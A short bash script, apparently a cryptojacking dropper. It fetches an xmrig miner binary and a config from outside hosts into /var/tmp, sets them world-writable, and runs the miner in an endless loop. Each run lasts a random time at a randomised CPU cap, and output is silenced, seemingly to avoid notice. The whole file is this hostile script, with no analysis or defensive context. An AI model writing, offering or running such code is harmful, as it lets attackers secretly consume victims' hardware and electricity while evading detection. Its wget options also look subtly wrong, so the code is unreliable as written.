#!/bin/bash
wget -o /var/tmp/ -L https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDMxNjF9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sInAiOiJibG9ic3JjL2Jsb2JzLXc1N2puai1xc281LWM0am4tcmp5eS01NDVlNXN2dSJ9.obKXsFRVMKOGcGKKKMXSqrc6oHVB9WlCuXJ35bKfVGY/xmrig > /dev/null 2>&1
wget -o /var/tmp/config.json https://www.toptal.com/developers/hastebin/losinazaci.json  > /dev/null 2>&1
chmod 777 /var/tmp/xmrig 
cd /var/tmp
t_min=45
t_max=120
cpu_min=5
cpu_max=40
chmod 777 xmrig
while true :
  do
    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
    cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)))
    echo $cpu
    cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=$cpu' > u.json
    mv u.json config.json 
    timeout $t ./xmrig -c config.json > /dev/null 2>&1
    sleep $t
done
